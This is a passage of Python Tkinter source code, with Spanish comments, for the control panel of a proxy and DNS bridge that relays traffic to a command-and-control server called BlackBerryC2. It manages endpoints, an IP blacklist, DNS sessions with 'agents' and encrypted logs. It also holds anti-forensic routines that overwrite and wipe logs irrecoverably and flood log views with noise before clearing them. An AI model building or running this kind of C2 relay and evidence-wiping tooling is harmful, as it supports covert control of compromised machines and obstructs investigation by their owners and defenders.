                                                     font=('Consolas', 8),
                                                     bg='#0a0c10', fg='#00e676',
                                                     insertbackground='#00d4ff',
                                                     selectbackground='#003459',
                                                     relief='flat', borderwidth=0)
        self.traffic_box.pack(fill='both', expand=True, padx=10, pady=5)
    
    # === Métodos auxiliares ===
    def _browse_file(self, entry):
        filename = filedialog.askopenfilename()
        if filename:
            entry.delete(0, tk.END)
            entry.insert(0, filename)
    
    # ── Helpers Treeview de endpoints ────────────────────────────────────────
    def _ep_reload_tree(self, eps=None):
        """Rellena el Treeview con la lista de endpoints."""
        self._ep_tree.delete(*self._ep_tree.get_children())
        for e in (eps if eps is not None else load_custom_endpoints()):
            self._ep_tree.insert('', 'end', iid=e['path'],
                                  values=(e['path'], e.get('task', 'message'), e.get('desc', '')))

    def _ep_current_list(self) -> list[dict]:
        """Retorna la lista actual del Treeview como [{path, task, desc}]."""
        result = []
        for iid in self._ep_tree.get_children():
            vals = self._ep_tree.item(iid, 'values')
            result.append({
                'path': vals[0],
                'task': vals[1] if len(vals) > 1 else 'message',
                'desc': vals[2] if len(vals) > 2 else '',
            })
        return result

    def _ep_on_select(self, _event=None):
        sel = self._ep_tree.selection()
        if sel:
            vals = self._ep_tree.item(sel[0], 'values')
            self._ep_path_var.set(vals[0])
            self._ep_task_var.set(vals[1] if len(vals) > 1 else 'message')
            self._ep_desc_var.set(vals[2] if len(vals) > 2 else '')

    def _ep_add_or_update(self):
        path = self._ep_path_var.get().strip()
        task = self._ep_task_var.get().strip()
        desc = self._ep_desc_var.get().strip()
        if not path.startswith('/'):
            messagebox.showwarning("Endpoint inválido",
                                   "La ruta debe comenzar con  /")
            return
        if task not in VALID_TASKS:
            messagebox.showwarning("Tarea inválida",
                f"Tarea desconocida: '{task}'\n"
                f"Válidas: {sorted(VALID_TASKS)}")
            return
        existing = self._ep_tree.get_children()
        if path in existing:
            self._ep_tree.item(path, values=(path, task, desc))
        else:
            self._ep_tree.insert('', 'end', iid=path, values=(path, task, desc))
        self._ep_path_var.set('')
        self._ep_task_var.set('message')
        self._ep_desc_var.set('')

    def _ep_remove(self):
        sel = self._ep_tree.selection()
        if not sel:
            messagebox.showinfo("Eliminar", "Selecciona un endpoint primero.")
            return
        self._ep_tree.delete(sel[0])
        self._ep_path_var.set('')
        self._ep_desc_var.set('')

    def _ep_save_temp(self):
        """Aplica los endpoints en memoria sin tocar disco."""
        eps = self._ep_current_list()
        proxy_config['endpoints']      = [e['path'] for e in eps]
        proxy_config['endpoint_tasks'] = {e['path']: e.get('task', 'message') for e in eps}
        messagebox.showinfo(
            "⚠ Solo temporal",
            f"Se aplicaron {len(eps)} endpoint(s) al proxy.\n\n"
            "⚠  Este cambio es SOLO EN MEMORIA.\n"
            "Se perderá cuando reinicies o cierres la aplicación.\n\n"
            "Usa 'Guardar (persistente)' para que sobreviva al reinicio."
        )
        self.log_status(f"Endpoints actualizados en memoria: {len(eps)}")

    def _ep_save_persistent(self):
        """Guarda los endpoints en disco y los aplica."""
        eps = self._ep_current_list()
        if not eps:
            messagebox.showwarning("Sin endpoints", "La lista está vacía.")
            return
        ok = save_custom_endpoints(eps)
        proxy_config['endpoints']      = [e['path'] for e in eps]
        proxy_config['endpoint_tasks'] = {e['path']: e.get('task', 'message') for e in eps}
        if ok:
            # Actualizar cabecera
            try:
                self._ep_hdr_lbl.config(text=" ✔ personalizados cargados",
                                         foreground='#00c853')
            except Exception:
                pass
            messagebox.showinfo(
                "✓ Guardado permanente",
                f"Se guardaron {len(eps)} endpoint(s) en:\n"
                f"{ENDPOINTS_CUSTOM_FILE}\n\n"
                "Se cargarán automáticamente al iniciar."
            )
            self.log_status(f"Endpoints guardados permanentemente ({len(eps)})")
        else:
            messagebox.showerror("Error", "No se pudo escribir el archivo de endpoints.")

    # Compatibilidad con código que llama _restore_endpoints (stop_proxy, etc.)
    def _restore_endpoints(self):
        self._ep_reload_tree(HTTP_ENDPOINTS_BASE)
        proxy_config['endpoints']      = [e['path'] for e in HTTP_ENDPOINTS_BASE]
        proxy_config['endpoint_tasks'] = {e['path']: e.get('task', 'message') for e in HTTP_ENDPOINTS_BASE}
        try:
            self._ep_hdr_lbl.config(text=" (base predeterminada)", foreground='#6e7681')
        except Exception:
            pass

    # Compat: apply_config lee proxy_config['endpoints'] directamente
    @property
    def endpoint_list(self):
        """Compat: acceso de solo lectura al Treeview de endpoints."""
        return self._ep_tree

    def _add_endpoint(self):
        self._ep_add_or_update()

    def _remove_endpoint(self):
        self._ep_remove()
    
    def _block_ip(self):
        ip = self.new_ip.get().strip()
        if ip:
            self.blocked_ips.add(ip)
            self._refresh_blacklist()
            self.new_ip.delete(0, tk.END)
    
    def _unblock_ip(self):
        selection = self.blacklist_box.curselection()
        if selection:
            ip = self.blacklist_box.get(selection[0])
            self.blocked_ips.discard(ip)
            self._refresh_blacklist()
    
    def _refresh_blacklist(self):
        self.blacklist_box.delete(0, tk.END)
        for ip in sorted(self.blocked_ips):
            self.blacklist_box.insert(tk.END, ip)
    
    def _reload_blacklist(self):
        self.blocked_ips = load_blacklist()
        self._refresh_blacklist()
    
    def save_blacklist_file(self):
        if save_blacklist(self.blocked_ips):
            messagebox.showinfo("Guardar", "Blacklist guardada correctamente")
        else:
            messagebox.showerror("Error", "Error guardando blacklist")
    
    def load_logs(self):
        try:
            # Elegir fuente: cifrado si hay clave, plano si no
            proxy_path  = LOG_PROXY_ENC_FILE if _PROXY_LOG_KEY else LOG_PROXY_FILE
            proxy_lines = _proxy_log_decrypt_lines(proxy_path)

            # Aviso si el log está cifrado pero no hay clave activa
            enc_note = ""
            if not _PROXY_LOG_KEY and os.path.isfile(LOG_PROXY_ENC_FILE):
                enc_note = "🔒  LOG CIFRADO  —  reinicia la app e introduce la passphrase\n" + "─"*62 + "\n"

            kws_http = ['HTTP','HTTPS','POST','GET','handshake','polling','SESSION']
            kws_tls  = ['TLS','SSL','handshake','Túnel']

            for box, lines in [
                (self.http_logs_box, [l for l in proxy_lines if any(k in l for k in kws_http)][-500:]),
                (self.tls_logs_box,  [l for l in proxy_lines if any(k in l for k in kws_tls)][-500:]),
                (self.proxy_logs_box, proxy_lines[-500:]),
            ]:
                box.configure(state='normal')
                box.delete(1.0, tk.END)
                if enc_note:
                    box.insert(tk.END, enc_note)
                box.insert(tk.END, '\n'.join(lines) + '\n')
                box.configure(state='disabled')
                box.see(tk.END)

            enc_note_locked = "🔒  LOG CIFRADO  —  reinicia e introduce la passphrase\n" + "─"*62 + "\n"

            # Log del servidor (cifrado si hay clave)
            self.server_logs_box.configure(state='normal')
            self.server_logs_box.delete(1.0, tk.END)
            if _SERVER_LOG_KEY and os.path.isfile(LOG_SERVER_ENC_FILE):
                srv_lines = _decrypt_enc_log(LOG_SERVER_ENC_FILE, _SERVER_LOG_KEY)
                self.server_logs_box.insert(tk.END, '\n'.join(srv_lines[-500:]) + '\n')
            elif os.path.isfile(LOG_SERVER_ENC_FILE) and not _SERVER_LOG_KEY:
                self.server_logs_box.insert(tk.END, enc_note_locked)
            elif os.path.exists(LOG_SERVER_FILE):
                with open(LOG_SERVER_FILE, 'r', encoding='utf-8', errors='replace') as f:
                    self.server_logs_box.insert(tk.END, ''.join(f.readlines()[-500:]))
            self.server_logs_box.configure(state='disabled')
            self.server_logs_box.see(tk.END)

            # Log DNS Bridge (cifrado si hay clave)
            self.dns_logs_box.configure(state='normal')
            self.dns_logs_box.delete(1.0, tk.END)
            if _DNS_LOG_KEY and os.path.isfile(LOG_DNS_ENC_FILE):
                dns_lines = _decrypt_enc_log(LOG_DNS_ENC_FILE, _DNS_LOG_KEY)
                self.dns_logs_box.insert(tk.END, '\n'.join(dns_lines[-500:]) + '\n')
            elif os.path.isfile(LOG_DNS_ENC_FILE) and not _DNS_LOG_KEY:
                self.dns_logs_box.insert(tk.END, enc_note_locked)
            elif os.path.exists(LOG_DNS_FILE):
                with open(LOG_DNS_FILE, 'r', encoding='utf-8', errors='replace') as f:
                    self.dns_logs_box.insert(tk.END, ''.join(f.readlines()[-500:]))
            self.dns_logs_box.configure(state='disabled')
            self.dns_logs_box.see(tk.END)

        except Exception as e:
            messagebox.showerror("Error", f"Error cargando logs: {e}")

    def _verify_passphrase_for_delete(self) -> bool:
        """Pide passphrase antes de cualquier borrado. Sin contraseña correcta = no borra."""
        import tkinter as _tk
        BG = _TH["bg"]; SURF = _TH["surface"]; BORDER = _TH["border"]
        TEXT = _TH["text"]; DIM = _TH["text_dim"]; ACCENT = _TH["accent"]
        RED = _TH["red"]; ENTRY = _TH["entry_bg"]

        result = {"ok": False}
        dlg = _tk.Toplevel(self.root)
        dlg.title("🔐 Verificación obligatoria")
        dlg.resizable(False, False)
        dlg.grab_set()
        dlg.configure(bg=BG)
        W, H = 460, 270
        sw = dlg.winfo_screenwidth(); sh = dlg.winfo_screenheight()
        dlg.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")

        _tk.Frame(dlg, bg=RED, height=3).pack(fill="x")
        hdr = _tk.Frame(dlg, bg=SURF); hdr.pack(fill="x")
        _tk.Label(hdr, text="  🗑  Verificación de identidad obligatoria",
                  bg=SURF, fg=RED, font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=16, pady=10)
        _tk.Frame(dlg, bg=BORDER, height=1).pack(fill="x")

        body = _tk.Frame(dlg, bg=BG); body.pack(fill="both", expand=True, padx=20, pady=14)
        _tk.Label(body, text="Introduce tu passphrase para confirmar el borrado irrecuperable.",
                  bg=BG, fg=TEXT, font=("Segoe UI", 9)).pack(anchor="w")
        _tk.Label(body, text="Sin passphrase correcta no se elimina ningún archivo.",
                  bg=BG, fg=DIM, font=("Segoe UI", 8, "italic")).pack(anchor="w", pady=(2, 12))

        pp_frame = _tk.Frame(body, bg=BORDER, padx=1, pady=1); pp_frame.pack(fill="x")
        pp_inner = _tk.Frame(pp_frame, bg=ENTRY); pp_inner.pack(fill="x")
        _tk.Label(pp_inner, text="  PASSPHRASE", bg=ENTRY, fg=DIM,
                  font=("Consolas", 7, "bold")).pack(anchor="w", padx=6, pady=(5,0))
        pp_var = _tk.StringVar()
        pp_e = _tk.Entry(pp_inner, textvariable=pp_var, show="●",
                         bg=ENTRY, fg=TEXT, insertbackground=ACCENT,
                         font=("Consolas", 12), relief="flat", bd=0)
        pp_e.pack(fill="x", padx=8, pady=(2,8))
        pp_e.focus_set()
        def _fi(_): pp_frame.configure(bg=ACCENT)
        def _fo(_): pp_frame.configure(bg=BORDER)
        pp_e.bind("<FocusIn>", _fi); pp_e.bind("<FocusOut>", _fo)

        err_var = _tk.StringVar()
        _tk.Label(body, textvariable=err_var, bg=BG, fg=RED,
                  font=("Segoe UI", 8)).pack(anchor="w", pady=(4,0))

        def _verify():
            pp = pp_var.get()
            if not pp:
                err_var.set("⚠  La passphrase es obligatoria"); return
            try:
                if _PROXY_LOG_KEY is not None and os.path.isfile(_PROXY_SALT_PATH):
                    with open(_PROXY_SALT_PATH, "rb") as f_s: salt = f_s.read()
                    test_key, _ = _derive_key(pp, salt)
                    import hmac as _hmac
                    if not _hmac.compare_digest(test_key, _PROXY_LOG_KEY):
                        err_var.set("⚠  Passphrase incorrecta"); pp_var.set(""); pp_e.focus_set(); return
                elif os.path.isfile(_PROXY_SALT_PATH):
                    with open(_PROXY_SALT_PATH, "rb") as f_s: salt = f_s.read()
                    key, _ = _derive_key(pp, salt)
                    if not _log_verify_key(key, LOG_PROXY_ENC_FILE) and os.path.isfile(LOG_PROXY_ENC_FILE):
                        err_var.set("⚠  Passphrase incorrecta"); pp_var.set(""); pp_e.focus_set(); return
                else:
                    err_var.set("⚠  Sin passphrase configurada — reinicia la app.")
                    pp_e.config(state="disabled")
                    confirm.config(bg="#111111", fg=_TH["text_dim"], cursor="arrow")
                    confirm.unbind("<Button-1>")
                    return
                result["ok"] = True
                dlg.destroy()
            except Exception as ex:
                err_var.set(f"⚠  Error: {ex}")

        btn_row = _tk.Frame(body, bg=BG); btn_row.pack(fill="x", pady=(10,0))
        confirm = _tk.Label(btn_row, text="  Confirmar borrado  →",
                            bg=RED, fg="#ffffff", font=("Segoe UI", 9, "bold"),
                            padx=14, pady=6, cursor="hand2")
        confirm.bind("<Button-1>", lambda _: _verify())
        confirm.bind("<Enter>", lambda _: confirm.config(bg="#a01010"))
        confirm.bind("<Leave>", lambda _: confirm.config(bg=RED))
        confirm.pack(side="left")
        cancel = _tk.Label(btn_row, text="  Cancelar",
                           bg=SURF, fg=DIM, font=("Segoe UI", 9),
                           padx=14, pady=6, cursor="hand2")
        cancel.bind("<Button-1>", lambda _: dlg.destroy())
        cancel.pack(side="left", padx=8)

        pp_e.bind("<Return>", lambda _: _verify())
        dlg.protocol("WM_DELETE_WINDOW", dlg.destroy)
        self.root.wait_window(dlg)
        return result["ok"]

    def clear_logs(self, which):
        """
        Borrado seguro irrecuperable. SIEMPRE exige passphrase — sin bypass.
        """
        try:
            # ── PASSPHRASE OBLIGATORIA — sin ella no se borra nada ─────────
            if not self._verify_passphrase_for_delete():
                return

            # Mapeo de tipo → archivos que le corresponden + widgets a limpiar
            _log_map = {
                'http':   ([LOG_PROXY_FILE, LOG_PROXY_ENC_FILE, _PROXY_SALT_PATH, TRAFFIC_LOG_FILE],
                           [self.http_logs_box, self.tls_logs_box, self.proxy_logs_box]),
                'tls':    ([LOG_PROXY_FILE, LOG_PROXY_ENC_FILE, _PROXY_SALT_PATH],
                           [self.tls_logs_box]),
                'proxy':  ([LOG_PROXY_FILE, LOG_PROXY_ENC_FILE, _PROXY_SALT_PATH, TRAFFIC_LOG_FILE,
                            f'{script_dir}/logs/BlackBerry_TLSProxyTraffic.log'],
                           [self.proxy_logs_box, self.http_logs_box, self.tls_logs_box]),
                'server': ([LOG_SERVER_FILE, LOG_SERVER_ENC_FILE, _SERVER_SALT_PATH],
                           [self.server_logs_box]),
                'dns':    ([LOG_DNS_FILE, LOG_DNS_ENC_FILE, _DNS_SALT_PATH],
                           [self.dns_logs_box]),
            }

            files_to_del, boxes = _log_map.get(which, ([], []))
            existing = [f for f in files_to_del if os.path.isfile(f)]
            enc_files = [f for f in existing if f.endswith(('.enc.log', '.salt'))]

            label_map = {
                'http':   "HTTP/HTTPS + Proxy + Tráfico",
                'tls':    "TLS",
                'proxy':  "Proxy + Tráfico",
                'server': "Servidor C2",
                'dns':    "DNS Bridge",
            }

            if not existing:
                messagebox.showinfo("Info",
                    f"No hay archivos de log [{label_map.get(which,which)}] que eliminar.")
                return

            names = '\n'.join(f"  • {os.path.basename(f)}" for f in existing)
            enc_warn = (
                "\n\n🔒  Los archivos cifrados y sus salt se sobreescriben con datos aleatorios\n"
                "   en 3 pasadas antes de eliminar (irrecuperable)."
            ) if enc_files else (
                "\n\n🔐  Borrado seguro: 3 pasadas aleatorias + 1 de ceros antes de eliminar."
            )

            if not messagebox.askyesno(
                f"⚠  Borrado seguro — {label_map.get(which, which)}",
                f"¿Eliminar de forma IRRECUPERABLE los logs de {label_map.get(which,which)}?\n\n"
                f"Archivos que se borrarán:\n{names}{enc_warn}\n\n"
                "Esta acción es PERMANENTE y NO se puede deshacer.",
                icon='warning'
            ):
                return

            errors = []
            for f in existing:
                try:    _secure_delete(f)
                except Exception as e: errors.append(f"{os.path.basename(f)}: {e}")

            # Limpiar widgets
            for box in boxes:
                try:
                    box.configure(state='normal')
                    box.delete(1.0, tk.END)
                    box.configure(state='disabled')
                except Exception:
                    pass

            # DNS: sobrescribir en memoria antes de limpiar widget (anti-forensia)
            if which == 'dns':
                for box in (self._dns_log_box, self.dns_logs_box):
                    try:
                        box.configure(state='normal')
                        # Sobrescribir con ruido antes de borrar
                        import os as _os
                        noise = ''.join(chr(_os.urandom(1)[0] % 26 + 65) for _ in range(512))
                        cur_len = int(box.index('end-1c').split('.')[0])
                        for _ in range(min(cur_len, 100)):
                            box.insert('end', noise + '\n')
                        box.delete('1.0', 'end')
                        box.configure(state='disabled')
                    except Exception:
                        pass
                # Vaciar también la cola en memoria
                while True:
                    try: _dns_log_q.get_nowait()
                    except: break

            if errors:
                messagebox.showwarning("Borrado parcial",
                    "Algunos archivos no pudieron eliminarse:\n" + '\n'.join(errors))
            else:
                messagebox.showinfo(
                    "✓ Borrado seguro completado",
                    f"{len(existing)} archivo(s) de [{label_map.get(which,which)}] "
                    "eliminados de forma irrecuperable."
                )

        except Exception as e:
            messagebox.showerror("Error", f"Error limpiando logs: {e}")
    
    def toggle_traffic_monitor(self):
        global traffic_monitor_enabled
        traffic_monitor_enabled = self.traffic_enabled.get()
        if traffic_monitor_enabled:
            self.log_status(f"{startnc} Monitor de tráfico activado")
        else:
            self.log_status(f"{startnc} Monitor de tráfico desactivado")
    
    def update_traffic(self):
        self.traffic_box.configure(state='normal')
        self.traffic_box.delete(1.0, tk.END)
        
        with traffic_lock:
            for entry in list(traffic_buffer)[-100:]:
                line = f"[{entry['timestamp']}] {entry['direction']} {entry['protocol']} {entry['ip']} | {entry['label']}\n"
                line += f"  Size: {entry['size']} bytes | Hex: {entry['hex'][:100]}...\n\n"
                self.traffic_box.insert(tk.END, line)
        
        self.traffic_box.configure(state='disabled')
        self.traffic_box.see(tk.END)
    
    def clear_traffic(self):
        with traffic_lock:
            traffic_buffer.clear()
        self.update_traffic()

    # ═══════════════════════════════════════════════════════════════════════
    #  TAB DNS BRIDGE — Monitor de puente puro (la lógica C2 está en server)
    # ═══════════════════════════════════════════════════════════════════════
    def _create_dns_tab(self, parent):
        # ── Config ─────────────────────────────────────────────────────────
        cfg = ttk.LabelFrame(parent, text="Configuración DNS Bridge")
        cfg.pack(fill='x', padx=8, pady=6)

        r0 = ttk.Frame(cfg); r0.pack(fill='x', padx=8, pady=4)
        self.dns_chk = _make_pill_toggle(r0,
            "● DNS BRIDGE  ACTIVO", "○ DNS BRIDGE  INACTIVO",
            self.dns_enabled_var, command=self._dns_toggle)
        if not DNSLIB_AVAILABLE:
            ttk.Label(r0, text="  ⚠ pip install dnslib", foreground='red').pack(side='left')

        r1 = ttk.Frame(cfg); r1.pack(fill='x', padx=8, pady=2)
        ttk.Label(r1, text="Puerto UDP:", width=13, anchor='e').pack(side='left')
        self.dns_port_var = tk.StringVar(value=str(DNS_DEFAULT_PORT))
        ttk.Entry(r1, textvariable=self.dns_port_var, width=7).pack(side='left', padx=4)
        ttk.Label(r1, text="  (≤1023 requiere sudo)").pack(side='left')

        r2 = ttk.Frame(cfg); r2.pack(fill='x', padx=8, pady=(2, 6))
        ttk.Label(r2, text="Dominio C2:", width=13, anchor='e').pack(side='left')
        self.dns_domain_var = tk.StringVar(value=DNS_DEFAULT_DOMAIN)
        ttk.Entry(r2, textvariable=self.dns_domain_var, width=30).pack(side='left', padx=4)
        ttk.Label(r2, text="  (el mismo configurado en BlackBerryCDNS)",
                  foreground='#6e7681').pack(side='left')

        # ── Estado rápido ───────────────────────────────────────────────────
        stat = ttk.LabelFrame(parent, text="Estado")
        stat.pack(fill='x', padx=8, pady=(0, 4))
        sf = ttk.Frame(stat); sf.pack(fill='x', padx=8, pady=4)
        self._dns_st_lbl = ttk.Label(sf, text="● Inactivo",
                                     foreground='#6e7681', font=('Consolas', 10, 'bold'))
        self._dns_st_lbl.pack(side='left')
        self._dns_info_lbl = ttk.Label(sf, text="  |  Sesiones: 0",
                                       font=('Arial', 9), foreground='#6e7681')
        self._dns_info_lbl.pack(side='left', padx=8)
        ttk.Button(sf, text="↺ Refrescar sesiones",
                   command=self._dns_refresh, width=18).pack(side='right')

        # ── Tabla de sesiones ───────────────────────────────────────────────
        tbl = ttk.LabelFrame(parent, text="Sesiones DNS activas")
        tbl.pack(fill='x', padx=8, pady=4)
        cols = ('sid', 'ip', 'fase', 'rx', 'tx', 'visto')
        self._dns_tree = ttk.Treeview(tbl, columns=cols, show='headings', height=5)
        for col, w, lbl in [
            ('sid',   90, 'SID'),
            ('ip',   120, 'IP agente'),
            ('fase',  75, 'Fase'),
            ('rx',    80, 'RX'),
            ('tx',    80, 'TX'),
            ('visto', 130, 'Último visto'),
        ]:
            self._dns_tree.heading(col, text=lbl)
            self._dns_tree.column(col, width=w, anchor='center')
        sb = ttk.Scrollbar(tbl, orient='vertical', command=self._dns_tree.yview)
        self._dns_tree.configure(yscrollcommand=sb.set)
        self._dns_tree.pack(side='left', fill='x', expand=True)
        sb.pack(side='right', fill='y')

        ttk.Label(
            parent,
            text="ℹ  El canal DNS es un puente puro. Comandos y sesiones se gestionan "
                 "desde BlackBerryC2_server — este panel solo monitorea el tráfico.",
            foreground='#6e7681', font=('Arial', 8, 'italic')
        ).pack(fill='x', padx=12, pady=(2, 4))

        # ── Log DNS (dark) ──────────────────────────────────────────────────
        log_f = ttk.LabelFrame(parent, text="Log DNS Bridge")
        log_f.pack(fill='both', expand=True, padx=8, pady=4)

        self._dns_log_box = scrolledtext.ScrolledText(
            log_f, height=12, state='disabled',
            font=('Consolas', 9),
            bg='#0a0c10', fg='#00e5ff',
            insertbackground='#00d4ff',
            selectbackground='#003459',
            relief='flat', borderwidth=0
        )
        self._dns_log_box.pack(fill='both', expand=True, padx=4, pady=4)

        lb = ttk.Frame(log_f); lb.pack(fill='x', padx=4, pady=(0, 4))
        ttk.Button(lb, text="🗑 Borrado seguro",
                   command=lambda: self.clear_logs('dns'), width=16).pack(side='left')
        ttk.Button(lb, text="Exportar", command=self._dns_export_log, width=10).pack(side='left', padx=6)

    # ── Métodos GUI DNS ───────────────────────────────────────────────────────
    def _dns_toggle(self):
        """Activar/desactivar DNS en caliente."""
        if self.running:
            if self.dns_enabled_var.get():
                try: proxy_config['dns_port'] = int(self.dns_port_var.get())
                except: proxy_config['dns_port'] = DNS_DEFAULT_PORT
                proxy_config['dns_domain'] = (
                    self.dns_domain_var.get().strip(".").strip() or DNS_DEFAULT_DOMAIN
                )
                proxy_config['dns_enabled'] = True
                ok = start_dns_bridge(self.log_status)
                if not ok:
                    self.dns_enabled_var.set(False)
                    proxy_config['dns_enabled'] = False
            else:
                proxy_config['dns_enabled'] = False
                stop_dns_bridge(self.log_status)
        self._dns_update_st()

    def _dns_update_st(self):
        try:
            if _dns_alive:
                port = proxy_config.get('dns_port', DNS_DEFAULT_PORT)
                self._dns_st_lbl.config(text=f"● Activo — UDP:{port}", foreground='#00c853')
            else:
                self._dns_st_lbl.config(text="● Inactivo", foreground='#6e7681')
        except Exception:
            pass

    def _dns_refresh(self):
        try:
            for row in self._dns_tree.get_children():
                self._dns_tree.delete(row)
            total_rx = total_tx = 0
            with _dns_sessions_lock:
                for sid, s in _dns_sessions.items():
                    fase = {0: "Nuevo", 1: "HS fase-1", 2: "Activo"}.get(s.hs_phase, "?")
                    last = time.strftime("%H:%M:%S", time.localtime(s.last_seen))
                    self._dns_tree.insert('', 'end', values=(
                        sid[:8], s.addr[0], fase,
                        format_bytes(s.rx), format_bytes(s.tx), last
                    ))
                    total_rx += s.rx; total_tx += s.tx
            cnt = len(_dns_sessions)
            self._dns_info_lbl.config(
                text=f"  |  Sesiones: {cnt}  |  RX: {format_bytes(total_rx)}"
                     f"  |  TX: {format_bytes(total_tx)}"
            )
            self._dns_update_st()
        except Exception:
            pass

    def _dns_log_append(self, msg: str):
        def _do():
            # Alimentar AMBOS widgets: DNS C2 tab + Logs tab → tiempo real
            for box in (self._dns_log_box, self.dns_logs_box):
                try:
                    box.configure(state='normal')
                    box.insert('end', msg + '\n')
                    lines = int(box.index('end-1c').split('.')[0])
                    if lines > 2000:
                        box.delete('1.0', f'{lines-2000}.0')
                    box.see('end')
                    box.configure(state='disabled')
                except Exception:
                    pass
        try: self.root.after(0, _do)
        except Exception: pass

    def _dns_log_poll(self):
        """Drena la cola de logs DNS → GUI cada 350 ms."""
        try:
            while True:
                self._dns_log_append(_dns_log_q.get_nowait())
        except Empty:
            pass
        except Exception:
            pass
        try: self._dns_update_st()
        except Exception: pass
        try: self.root.after(350, self._dns_log_poll)
        except Exception: pass

    def _dns_clear_log(self):
        try:
            self._dns_log_box.configure(state='normal')
            self._dns_log_box.delete('1.0', 'end')
            self._dns_log_box.configure(state='disabled')
        except Exception:
            pass

    def _dns_export_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension='.log',
            filetypes=[('Log', '*.log'), ('Texto', '*.txt'), ('Todo', '*.*')],
            title='Exportar log DNS Bridge'
        )
        if not path:
            return
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(self._dns_log_box.get('1.0', 'end'))
            messagebox.showinfo("Exportar", f"Log guardado:\n{path}")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def _update_verbose(self):
        set_proxy_verbose_mode(self.verbose_var.get())
        self.log_status(f"Modo verbose: {self.verbose_var.get()}")
    
    def log_status(self, text):
        def update():
            try:
                self.status_box.configure(state='normal')
                self.status_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {text}\n")
                lines = int(self.status_box.index('end-1c').split('.')[0])
                if lines > 500:
                    self.status_box.delete("1.0", f"{lines-500}.0")
                self.status_box.see(tk.END)
                self.status_box.configure(state='disabled')
            except:
                pass
        
        if threading.current_thread() == threading.main_thread():
            update()
        else:
            self.root.after(0, update)
        logger.info(text)
    
    def start_proxy(self):
        if self.running:
            messagebox.showinfo("Info", "Ya está corriendo")
            return

        # Validar certificados si se usa HTTPS
        if self.https_var.get():
            cert_path = self.cert_entry.get()
            key_path = self.key_entry.get()
        
            if not os.path.exists(cert_path):
                messagebox.showerror("Error", f"Certificado no encontrado:\n{cert_path}")
                return
        
            if not os.path.exists(key_path):
                messagebox.showerror("Error", f"Clave privada no encontrada:\n{key_path}")
                return

        proxy_config['mode'] = self.mode_var.get()
        proxy_config['listen_host_tls'] = self.tls_host.get()
        proxy_config['listen_port_tls'] = int(self.tls_port.get())
        proxy_config['listen_host_http'] = self.http_host.get()
        proxy_config['listen_port_http'] = int(self.http_port.get())
        proxy_config['target_host'] = self.backend_host.get()
        proxy_config['target_port'] = int(self.backend_port.get())
        proxy_config['certfile'] = self.cert_entry.get()
        proxy_config['keyfile'] = self.key_entry.get()
        proxy_config['use_https'] = self.https_var.get()

        # ── DNS Bridge ─────────────────────────────────────────────────────
        proxy_config['dns_enabled'] = self.dns_enabled_var.get()
        try:
            proxy_config['dns_port'] = int(self.dns_port_var.get())
        except Exception:
            proxy_config['dns_port'] = DNS_DEFAULT_PORT
        proxy_config['dns_domain'] = (
            self.dns_domain_var.get().strip().strip(".") or DNS_DEFAULT_DOMAIN
        )

        # Obtener endpoints desde el Treeview (path + tasks)
        eps = self._ep_current_list()
        proxy_config['endpoints']      = [e['path'] for e in eps]
        proxy_config['endpoint_tasks'] = {e['path']: e.get('task', 'message') for e in eps}
        
        self.btn_start.config(state='disabled')
        self.btn_stop.config(state='normal')
        
        self.running = True
        self.server_thread = threading.Thread(
            target=start_proxy_server, 
            args=(self.log_status, self.blocked_ips), 
            daemon=True
        )
        self.server_thread.start()
        
        mode_str = "HTTPS" if proxy_config['use_https'] else "HTTP"
        self.log_status(f"{startnc} Iniciado en modo {proxy_config['mode'].upper()} ({mode_str})")
    
    def stop_proxy(self):
        if not self.running:
            return
        
        self.btn_stop.config(state='disabled', text='Deteniendo...')
        self.root.update_idletasks()
        
        self.log_status("Deteniendo proxy...")
        
        def stop_thread():
            try:
                stop_proxy_server()
                self.root.after(0, lambda: self._finish_stop())
            except Exception as e:
                logger.error(f"Error deteniendo proxy: {e}")
                self.root.after(0, lambda: self._finish_stop(error=str(e)))
        
        threading.Thread(target=stop_thread, daemon=True).start()
    
    def _finish_stop(self, error=None):
        self.running = False
        self.btn_start.config(state='normal')
        self.btn_stop.config(state='disabled', text='Detener')
        
        self._restore_endpoints()
        
        if error:
            self.log_status(f"{alertnc} Detenido con error: {error}")
        else:
            self.log_status(f"{startnc} Proxy detenido correctamente")
    
    def on_closing(self):
        if self.running:
        # Mostrar diálogo de cierre
            response = messagebox.askyesno(
                "Cerrar aplicación",
                "El proxy está activo. ¿Desea detenerlo y cerrar la aplicación?"
            )
        
            if not response:
                return
        
            # Deshabilitar botones
            self.btn_start.config(state='disabled')
            self.btn_stop.config(state='disabled')
            self.log_status("Cerrando aplicación...")
            self.info_label.config(text="Estado: CERRANDO...")
            self.root.update()
        
            # Detener proxy
            stop_proxy_server()
        
             # Esperar un poco para que los threads terminen
            time.sleep(1)
    
        # Guardar blacklist
        try:
            if save_blacklist(self.blocked_ips):
                self.log_status(f"{startnc} Blacklist guardada")
        except Exception as e:
            logger.error(f"Error guardando blacklist: {e}")
    
        # Cerrar GUI
        try:
            self.log_status(f"{startnc} Cerrando GUI...")
            time.sleep(0.5)
            self.root.quit()
            self.root.destroy()
        except:
            pass

    def _schedule_log_refresh(self):
        """Recarga los logs automáticamente cada 15 segundos."""
        try:
            self.load_logs()
        except Exception:
            pass
        try:
            self.root.after(15000, self._schedule_log_refresh)
        except Exception:
            pass

    def update_display(self):
        try:
            if self.running:
                active    = sum(len(conns) for conns in active_connections.values())
                http_sess = len(http_sessions)
                dns_sess  = len(_dns_sessions)
                self.info_label.config(text="Estado: ACTIVO")
                mode_str = "HTTPS" if proxy_config.get('use_https') else "HTTP"
                dns_tag  = " + DNS Bridge" if proxy_config.get('dns_enabled') else ""
                self.mode_label.config(
                    text=f"Modo: {proxy_config.get('mode', '-').upper()} ({mode_str}){dns_tag}"
                )
                dns_info = f" | DNS: {dns_sess}" if proxy_config.get('dns_enabled') else ""
                self.connections_label.config(
                    text=f"TLS: {active} | HTTP: {http_sess}{dns_info}"
                )
            else:
                self.info_label.config(text="Estado: Detenido")
                self.mode_label.config(text="Modo: -")
                self.connections_label.config(text="Conexiones: 0")
        except:
            pass
        self.root.after(2000, self.update_display)

def _passphrase_gate(root: tk.Tk) -> bool:
    """
